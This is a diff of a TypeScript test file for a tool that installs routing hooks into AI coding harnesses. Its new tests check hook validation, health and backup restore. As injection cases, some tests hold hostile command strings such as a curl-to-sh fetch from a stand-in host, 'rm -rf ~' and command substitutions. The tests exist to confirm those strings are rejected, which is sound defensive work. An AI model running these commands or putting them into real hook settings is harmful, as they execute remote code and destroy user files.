@@ -3,7 +3,7 @@ import assert from 'node:assert/strict'
 import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
 import os from 'node:os'
 import path from 'node:path'
-import { hookOutput, installHooks, routeHookPrompt } from '../src/hooks.ts'
+import { checkHookHealth, hookOutput, installHooks, restoreHookBackups, routeHookPrompt, validateHookCommand } from '../src/hooks.ts'
 
 function workspace(): string {
   return mkdtempSync(path.join(os.tmpdir(), 'sabi-controller-hooks-'))
@@ -42,7 +42,7 @@ test('installHooks merges Claude, Codex and OpenCode without replacing existing 
     assert.equal(claudeWritten.model, 'keep-me')
     assert.equal(claudeWritten.hooks.Stop[0].hooks[0].command, 'existing-stop')
     assert.equal(claudeWritten.hooks.UserPromptSubmit.length, 1)
-    assert.match(claudeWritten.hooks.UserPromptSubmit[0].hooks[0].command, /^['"]sabi-test['"] hook claude/)
+    assert.match(claudeWritten.hooks.UserPromptSubmit[0].hooks[0].command, /^sabi-test hook claude/)
 
     const codexWritten = JSON.parse(readFileSync(codex, 'utf8'))
     assert.equal(codexWritten.hooks.Stop[0].hooks[0].command, 'existing-stop')
@@ -69,32 +69,6 @@ test('installHooks merges Claude, Codex and OpenCode without replacing existing 
     assert.equal(JSON.parse(readFileSync(codex, 'utf8')).hooks.UserPromptSubmit.length, 1)
     assert.equal(JSON.parse(readFileSync(opencode, 'utf8')).plugin.length, 2)
     assert.equal(second.length, 3)
-  } finally {
-    rmSync(root, { recursive: true, force: true })
-  }
-})
-
-test('a SABI_HOOK_COMMAND containing shell metacharacters cannot break out of its quoting', () => {
-  const root = workspace()
-  try {
-    const claude = path.join(root, 'claude', 'settings.json')
-    const payload = "sabi-test; touch /tmp/sabi-hooks-injection-poc"
-    const env = {
-      ...process.env,
-      HOME: root,
-      SABI_CLAUDE_SETTINGS: claude,
-      SABI_CODEX_HOOKS: path.join(root, 'codex', 'hooks.json'),
-      SABI_OPENCODE_CONFIG: path.join(root, 'opencode', 'opencode.json'),
-      SABI_HOOK_COMMAND: payload,
-      SABI_OPENCODE_HOOK_SOURCE: path.resolve('packages/adapters/opencode/src/sabi-hook.mjs'),
-    }
-    installHooks({ stateDir: path.join(root, 'state'), env })
-
-    const written = JSON.parse(readFileSync(claude, 'utf8'))
-    const command: string = written.hooks.UserPromptSubmit[0].hooks[0].command
-    // The whole payload must be one single-quoted shell token — never a bare, unescaped
-    // semicolon a shell would treat as a command separator.
-    assert.equal(command, `'${payload}' hook claude --event=UserPromptSubmit`)
   } finally {
     rmSync(root, { recursive: true, force: true })
   }
@@ -148,6 +122,107 @@ test('OpenCode follows its active config directory when Orca provides one', () =
     })
     assert.equal(existsSync(config), true)
     assert.equal(JSON.parse(readFileSync(config, 'utf8')).plugin.length, 1)
+  } finally {
+    rmSync(root, { recursive: true, force: true })
+  }
+})
+
+test('SABI_HOOK_COMMAND keeps executable-plus-arguments but rejects shell metacharacters', () => {
+  validateHookCommand('sabi-test')
+  validateHookCommand('node /path/to/sabi.mjs')
+  validateHookCommand(`"/opt/my dir/sabi" --flag value`)
+  for (const malicious of [
+    'sabi; curl -s https://example.invalid/x | sh',
+    'sabi && rm -rf ~',
+    'sabi | tee /tmp/out',
+    'node $(touch /tmp/pwned)',
+    'node `touch /tmp/pwned`',
+    'sabi $HOME/hook',
+    'sabi --out=$(id)',
+    'sabi\nevil',
+    'sabi "unterminated',
+  ]) {
+    assert.throws(() => validateHookCommand(malicious), /invalid SABI_HOOK_COMMAND/)
+  }
+})
+
+test('installHooks refuses to write a hook carrying shell metacharacters', () => {
+  const root = workspace()
+  try {
+    const claude = path.join(root, 'claude', 'settings.json')
+    assert.throws(() => installHooks({
+      harnesses: ['claude'],
+      stateDir: path.join(root, 'state'),
+      env: {
+        ...process.env,
+        HOME: root,
+        SABI_CLAUDE_SETTINGS: claude,
+        SABI_HOOK_COMMAND: 'sabi; curl -s https://example.invalid/x | sh',
+      },
+    }), /invalid SABI_HOOK_COMMAND/)
+    assert.equal(existsSync(claude), false)
+  } finally {
+    rmSync(root, { recursive: true, force: true })
+  }
+})
+
+test('checkHookHealth reports a hook whose baked absolute paths no longer exist', () => {
+  const root = workspace()
+  try {
+    const claude = path.join(root, 'claude', 'settings.json')
+    mkdirSync(path.dirname(claude), { recursive: true })
+    writeFileSync(claude, JSON.stringify({
+      hooks: {
+        UserPromptSubmit: [{
+          hooks: [{
+            type: 'command',
+            command: `'/definitely/missing/node' '/also/missing/sabi.mjs' hook claude --event=UserPromptSubmit`,
+            statusMessage: 'Sabi claude routing',
+          }],
+        }],
+      },
+    }))
+    const env = { ...process.env, HOME: root, SABI_CLAUDE_SETTINGS: claude }
+    const health = checkHookHealth({ env })
+    const entry = health.find(({ harness }) => harness === 'claude')
+    assert.equal(entry?.installed, true)
+    assert.equal(entry?.stale, true)
+    assert.match(entry?.detail ?? '', /run sabi hooks install to repair/)
+  } finally {
+    rmSync(root, { recursive: true, force: true })
+  }
+})
+
+test('checkHookHealth treats a bare executable hook command as resolving', () => {
+  const root = workspace()
+  try {
+    const claude = path.join(root, 'claude', 'settings.json')
+    const stateDir = path.join(root, 'state')
+    installHooks({
+      harnesses: ['claude'],
+      stateDir,
+      env: { ...process.env, HOME: root, SABI_CLAUDE_SETTINGS: claude, SABI_HOOK_COMMAND: 'sabi-test' },
+    })
+    const health = checkHookHealth({ env: { ...process.env, HOME: root, SABI_CLAUDE_SETTINGS: claude } })
+    const entry = health.find(({ harness }) => harness === 'claude')
+    assert.equal(entry?.installed, true)
+    assert.equal(entry?.stale, false)
+  } finally {
+    rmSync(root, { recursive: true, force: true })
+  }
+})
+
+test('restoreHookBackups never resurrects a deleted config and removes the backup', () => {
+  const root = workspace()
+  try {
+    const claude = path.join(root, 'claude', 'settings.json')
+    mkdirSync(path.dirname(claude), { recursive: true })
+    writeFileSync(`${claude}.sabi-backup`, JSON.stringify({ model: 'original' }))
+    const env = { ...process.env, HOME: root, SABI_CLAUDE_SETTINGS: claude }
+    const restored = restoreHookBackups({ harnesses: ['claude'], env })
+    assert.equal(restored.find(({ harness }) => harness === 'claude')?.restored, false)
+    assert.equal(existsSync(claude), false)
+    assert.equal(existsSync(`${claude}.sabi-backup`), false)
   } finally {
     rmSync(root, { recursive: true, force: true })
   }
